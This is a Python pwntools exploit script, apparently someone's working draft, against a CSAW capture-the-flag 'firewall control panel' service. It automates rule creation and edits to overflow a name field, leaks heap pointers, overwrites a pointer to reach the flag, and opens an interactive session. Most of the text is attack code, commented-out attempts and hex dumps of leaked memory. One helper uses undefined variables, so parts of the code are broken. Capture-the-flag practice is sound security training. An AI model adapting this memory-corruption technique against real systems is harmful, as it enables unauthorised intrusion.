#!/usr/bin/env python

from pwn import *
from time import sleep
# nc firewall.chal.csaw.io 4141

with open('payload', 'w') as f:
	f.write('')


def send(conn, line):
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)
	conn.send(line)


def add_firewall_rule(conn, fname="lol", fport="1234", ftype="TCP"):

	send(conn, "1")
	# print conn.recvuntil("ENTER RULE NAME:")
	send(conn, fname)
	# print conn.recvuntil("ENTER RULE PORT:")
	send(conn, fport)
	# print conn.recvuntil("ENTER RULE TYPE:")
	send(conn, ftype)
	# print conn.recvuntil("PRESS ENTER TO RETURN TO MENU")
	send(conn, "")
	return


def edit_firewall_rule(conn, num="16", fname="lol", fport="1234", ftype="TCP"):

	send(conn, "2")
	# print conn.recvuntil("ENTER RULE NUMBER TO EDIT:")
	send(conn, num)
	# print conn.recvuntil("ENTER RULE NAME:")
	send(conn, fname)
	# print conn.recvuntil("ENTER RULE PORT:")
	send(conn, fport)
	# print conn.recvuntil("ENTER RULE TYPE:")
	send(conn, ftype)

	# print conn.recvuntil("PRESS ENTER TO RETURN TO MENU")
	send(conn, "")
	return


def chunks(l, n):
	"""return a list of successive n-sized chunks from l."""
	arr = []
	for i in range(0, len(l), n):
		arr.append(l[i:i+n])
	return arr

def read_firewall_rule(conn, num="16"):

	dat = ""

	send(conn, "4")
	# print conn.recvuntil("ENTER RULE NUMBER TO PRINT:")
	send(conn, num)
	# print conn.recvuntil("| - Name:")
	# fname = conn.recvuntil("\n")[1:]
	# print conn.recvuntil("| - Port:")
	# fport = conn.recvuntil("\n")[1:]
	# print conn.recvuntil("| - Type:")
	# ftype = conn.recvuntil("\n")[1:]

	if fname.encode('hex') != "f1260168f1260184f12601a0f12601bcf12601d8f12601f4f12601016e616d65310a":
		print "LEAK IS DIFFERENT!!!"

	if fport.encode('hex') != "3239340a":
		print "LEAK IS DIFFERENT!!!"

	if ftype.encode('hex') != "f4f12601016e616d65310a":
		print "LEAK IS DIFFERENT!!!"


	print [x.encode('hex') for x in chunks(fname,4)]
	print [x.encode('hex') for x in chunks(fport,4)]
	print [x.encode('hex') for x in chunks(ftype,4)]

	# print conn.recvuntil("PRESS ENTER TO RETURN TO MENU")
	send(conn, "")
	return fname, fport, ftype


def delete_firewall_rule(conn, num="16"):


	send(conn, "3")
	# print conn.recvuntil("| ENTER RULE NUMBER TO DELETE:")
	send(conn, num)

	# print conn.recvuntil("PRESS ENTER TO RETURN TO MENU")
	send(conn, "")
	return 

# while True:
# 	try:
def gogo():
	conn = remote('firewall.chal.csaw.io', 4141)
	# conn.recvuntil("FIREWALL CONTROL PANEL")
	send(conn, "352762356")
	for x in range(16):
		print "[!] "
		add_firewall_rule(conn, fname="RULE " + str(x))

	# edit_firewall_rule(conn, num="16", fname='A'*27 + '\xDE\xCA\xFA',ftype='\xDE\xCA\xFA')

	edit_firewall_rule(conn, num="16", fname='A'*28 + '\x42\x42',ftype='5678')
	return conn
		# send(conn, '6\n');sleep(1); print conn.recv()
		# send(conn, '6\n');sleep(1); print conn.recv()
def start():
	conn = remote('firewall.chal.csaw.io', 4141)
	# conn.recvuntil("FIREWALL CONTROL PANEL")
	send(conn, "352762356")
	return conn


conn = start()
add_firewall_rule(conn, fname="name1")
add_firewall_rule(conn, fname="name2")

# send(conn, "\n")

# send(conn, "2")
# print conn.recvuntil("ENTER RULE NUMBER TO EDIT:")
# send(conn, num)
# print conn.recvuntil("ENTER RULE NAME:")
# send(conn, fname)
# print conn.recvuntil("ENTER RULE PORT:")
# send(conn, fport)
# print conn.recvuntil("ENTER RULE TYPE:")
# conn.send(ftype)


# read_firewall_rule(conn, num="0")
delete_firewall_rule(conn, num="0")##
# read_firewall_rule(conn, num="1")

# flag = p32(0x412b31)

# edit_firewall_rule(conn, num="0", fname='', fport="0", ftype=flag)



# edit_firewall_rule(conn, num="16", fname='A'*27 + '\xDE\xCA\xFA', fport=str(0x4242), ftype='\xDE\xCA\xFA')
# edit_firewall_rule(conn, num="0", fname= flag, fport=str(0x4242), ftype='TCP')

# nleak = ['f1260168', 'f1260184', 'f12601a0', 'f12601bc', 'f12601d8', 'f12601f4', 'f1260101', '6c6f6c0a']
# fname, fport, ftype = read_firewall_rule(conn, num="0")

# print fname.encode('hex')




# edit_firewall_rule(conn, num="0", fname="", fport="294", ftype='TCP')


# edit_firewall_rule(conn, num="0", fname="", fport="0", ftype=chr(0x31) + "\x2b\x41")##f4f12601
# edit_firewall_rule(conn, num="0", fname="", fport="0", ftype=p32(0xf4f12601))##f4f12601

# edit_firewall_rule(conn, num="0", fname="", fport="0", ftype=p32(0x0126f1f4))##f4f12601
offset_to_flag = 457
# edit_firewall_rule(conn, num="0", fname="", fport="0", ftype=p32(0x0126f1f4+offset_to_flag))##f4f12601
edit_firewall_rule(conn, num="0", fname="", fport="0", ftype=p32(0x0040f754))##f4f12601

# 0x01242b31

# edit_firewall_rule(conn, num="0", fname='f1260168f1260184f12601a0f12601bcf12601d8f12601f4'.decode('hex'), fport="294", ftype=p32(0xf4f12601))##f4f12601

# edit_firewall_rule(conn, num="0", fname='f1260168f1260184f12601a0f12601bcf12601d8f12601f4 f12601016e616d6531'.decode('hex'), fport="294", ftype=p32(0xf4f12601))##f4f12601
conn.interactive()



# send(conn, "2")

# print conn.recvuntil("ENTER RULE NUMBER TO EDIT:")
# send(conn, "0")

# print conn.recvuntil("ENTER RULE NAME:")
# conn.send("\n")

# print conn.recvuntil("ENTER RULE PORT:")
# conn.send("\n")

# print conn.recvuntil("ENTER RULE TYPE:")
# conn.send(flag)

# print conn.recvuntil("PRESS ENTER TO RETURN TO MENU")
# send(conn, "")

# read_firewall_rule(conn, num="0")

# conn.interactive()
# 352762356
# 0xFACADE





# send(conn, '5');sleep(1); print conn.recv().split('\n')[-2].encode('hex')


# 0x412b31



# ['f1260168', 'f1260184', 'f12601a0', 'f12601bc', 'f12601d8', 'f12601f4', 'f1260101', '6e616d65', '310a']
# ['3239340a']
# ['f4f12601', '016e616d', '65310a']

# ['f1260168', 'f1260184', 'f12601a0', 'f12601bc', 'f12601d8', 'f12601f4', 'f1260101', '6e616d65', '310a']
# ['f1260168', 'f1260184', 'f12601a0', 'f12601bc', 'f12601d8', 'f12601f4', 'f1260101', '6e616d65', '310a']
# ['3239340a']
# ['3239340a']
# ['f4f12601', '016e616d', '65310a']
# ['f4f12601', '016e616d', '65310a']


# # 0x01242b31



# 00000690: 3637 3239 350a 7c20 2d20 4e61 6d65 3a20  67295.| - Name:
# 000006a0: f126 0168 f126 0184 f126 01a0 f126 01bc  .&.h.&...&...&..
# 000006b0: f126 01d8 f126 01f4 f126 0101 6e61 6d65  .&...&...&..name
# 000006c0: 310a 7c20 2d20 506f 7274 3a20 3239 340a  1.| - Port: 294.
# 000006d0: 7c20 2d20 5479 7065 3a20 f4f1 2601 016e  | - Type: ..&..n
